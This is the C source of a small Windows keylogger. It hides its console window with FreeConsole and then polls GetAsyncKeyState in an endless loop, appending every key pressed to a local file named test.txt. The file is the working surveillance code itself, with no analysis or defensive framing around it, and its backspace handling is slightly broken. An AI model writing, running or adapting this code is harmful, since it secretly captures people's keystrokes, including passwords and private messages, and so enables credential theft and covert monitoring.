#include <stdio.h>
#include <windows.h>


void writeInFile(char my_char){
    FILE *f;
    f = fopen("./test.txt", "a+");
    if(f == NULL)
        printf("File did not open");
    else{
        if(my_char == 8)
            fseek(f, -5, SEEK_CUR);
        else
            fprintf(f, "%c", my_char);

        printf("pos = %ld\n\n", ftell(f));
        fclose(f);
    }
}

void gettingKeys(){

    while(1){
        for(int i = 8; i < 256; i ++){ //ascii codes that i need
            if(GetAsyncKeyState(i) & 0x01 > 0){ //lsb > 0 (avoiding print multiple times if char is pressed only once)
                // printf("%c", (char)i);
                char my_char = (char)i;
                writeInFile(my_char);

            }
    }

    }


}

int main() {
    FreeConsole();
    gettingKeys();

}
